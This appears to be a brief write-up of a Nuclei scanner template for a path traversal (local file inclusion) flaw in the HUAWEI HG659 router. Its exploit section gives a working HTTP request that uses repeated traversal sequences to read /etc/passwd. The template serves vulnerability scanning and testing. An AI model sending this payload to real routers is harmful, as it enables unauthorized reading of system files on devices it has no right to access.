# Nuclei Template: HUAWEI HG659 - Local File Inclusion
**Template ID:** huawei-hg659-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`huawei-hg659-lfi.yaml`)

## Vulnerability Information & PoC

## Description
HUAWEI HG659 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/lib///....//....//....//....//....//....//....//....//etc//passwd
```

## References
- https://twitter.com/sec715/status/1406782172443287559
